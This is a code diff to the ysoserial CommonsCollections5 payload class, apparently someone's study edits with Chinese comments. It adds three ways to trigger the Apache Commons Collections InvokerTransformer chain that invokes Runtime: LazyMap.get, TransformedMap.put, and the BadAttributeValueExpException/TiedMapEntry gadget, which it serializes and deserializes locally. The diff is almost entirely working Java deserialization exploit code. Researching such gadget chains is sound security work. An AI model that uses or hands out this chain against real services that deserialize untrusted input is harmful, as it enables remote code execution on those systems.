@@ -15,6 +15,9 @@ import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
+import org.apache.commons.collections.map.TransformedMap;
+import ysoserial.Deserializer;
+import ysoserial.Serializer;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
@@ -103,7 +106,30 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
         ChainedTransformer c = new ChainedTransformer(new Transformer[]{i1, i2, i3});
         c.transform(Runtime.class);
 
+        //LazyMap的反序列化方式
+        HashMap map = new HashMap();
+        Map lazyMap = LazyMap.decorate(map, c);
+        lazyMap.get(Runtime.class);
 
+
+        //另一种方式
+        HashMap map2 = new HashMap();
+        Map map1 = TransformedMap.decorate(map2,c,c);
+        map1.put("1","1");
+
+
+        //另一种方式
+        HashMap map3 = new HashMap();
+        final Map lazyMap2 = LazyMap.decorate(map3, c);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap2, "foo");
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+        Field valfield = val.getClass().getDeclaredField("val");
+        Reflections.setAccessible(valfield);
+        valfield.set(val, entry);
+
+        Deserializer.deserialize(Serializer.serialize(val));
+
+        Reflections.setFieldValue(c, "iTransformers", new Transformer[]{new ConstantTransformer(1)}); // arm with actual transformer chain
 
 //		PayloadRunner.run(CommonsCollections5.class, args);
 //		PayloadRunner.run(CommonsCollections5.class, args);
